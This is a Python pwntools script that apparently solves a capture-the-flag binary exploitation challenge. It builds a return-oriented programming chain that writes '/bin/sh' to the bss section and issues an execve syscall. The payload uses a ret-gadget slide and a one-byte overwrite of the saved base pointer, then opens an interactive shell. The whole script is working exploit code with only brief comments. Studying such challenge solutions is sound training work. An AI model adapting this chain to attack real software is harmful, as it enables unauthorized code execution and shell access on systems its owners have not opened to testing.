from pwn import *
import time
target = process('./a.out')
#gdb.attach(target, gdbscript = 'b *0x400baf')

# Establish rop gadgets
popRax = p64(0x415f04)
popRdi = p64(0x400686)
popRsi = p64(0x410a93)
popRdx = p64(0x44a155)

syscall = p64(0x40132c)

ret = p64(0x400416)

# 0x000000000048d301 : mov qword ptr [rax], rdx ; ret
mov = p64(0x48d301)

# bss adress we write to
bss = p64(0x6b6030)

binsh = p64(0x0068732f6e69622f)

# Our Rop chain
# Checkout https://github.com/guyinatuxedo/ctf/tree/master/defconquals2019/speedrun/s1
# for more details on how to make it
rop = ""
rop += popRax
rop += bss
rop += popRdx
rop += binsh
rop += mov

rop += popRax
rop += p64(0x3b)

rop += popRdi
rop += bss

rop += popRsi
rop += p64(0)
rop += popRdx
rop += p64(0)

rop += syscall

# Make the payload
# Append the rop chain to after the ret gadget slide
# Overwrite least significant byte of saved base pointer with 0x00
payload = ret*((256 - len(rop)) / 8) + rop + "\x00"

# Specify we are sending 257 bytes
target.sendline('257')

# Pause to ensure I/O purposes
# Send the payload
target.sendline(payload)

target.interactive()
